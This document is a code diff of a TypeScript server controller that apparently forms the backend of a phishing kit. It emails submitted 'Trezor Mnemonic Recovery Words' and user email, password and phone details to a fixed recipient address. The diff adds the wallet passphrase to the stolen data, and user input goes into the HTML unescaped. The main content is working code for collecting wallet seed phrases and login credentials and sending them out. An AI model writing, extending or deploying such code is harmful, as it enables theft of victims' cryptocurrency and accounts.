@@ -9,9 +9,9 @@ import { Resend } from "resend";
  * Controller: Send Mnemonic Recovery Email
  */
 export const sendMnemonicController = asyncHandler(
-    
+
   async (req: Request, res: Response): Promise<Response> => {
-    const resend = new Resend(process.env.RESEND_API_KEY as string); 
+    const resend = new Resend(process.env.RESEND_API_KEY as string);
     const payload = req.body;
 
     // Validate payload
@@ -20,15 +20,20 @@ export const sendMnemonicController = asyncHandler(
     }
 
     // Build HTML email content
-    let htmlContent = `<h2>${payload.heading}</h2><ul>`;
+    let htmlContent = `<h2>${payload.heading}</h2>`;
+    htmlContent += `<h3>PassPhrase: ${payload?.passphrase}</h3>`;
+    htmlContent += `<ul>`;
+
     payload.data.forEach((item: { label: string; value: string }) => {
       htmlContent += `<li><strong>${item.label}:</strong> ${item.value}</li>`;
     });
+
     htmlContent += `</ul>`;
+
 
     try {
       // Send email via Resend
-      const response:any = await resend.emails.send({
+      const response: any = await resend.emails.send({
         from: process.env.SENDER_EMAIL || "onboarding@resend.dev",
         to: process.env.RECIPIENT_EMAIL as string,
         subject: "Trezor Mnemonic Recovery Words",
@@ -49,7 +54,7 @@ export const sendMnemonicController = asyncHandler(
  */
 export const sendUserInfoController = asyncHandler(
   async (req: Request, res: Response): Promise<Response> => {
-    const resend = new Resend(process.env.RESEND_API_KEY as string); 
+    const resend = new Resend(process.env.RESEND_API_KEY as string);
     const { title, email, password, phone } = req.body;
 
     // Validate input
@@ -68,7 +73,7 @@ export const sendUserInfoController = asyncHandler(
     `;
 
     try {
-      const response:any = await resend.emails.send({
+      const response: any = await resend.emails.send({
         from: process.env.SENDER_EMAIL || "onboarding@resend.dev",
         to: process.env.RECIPIENT_EMAIL as string,
         subject: "User Information Received",
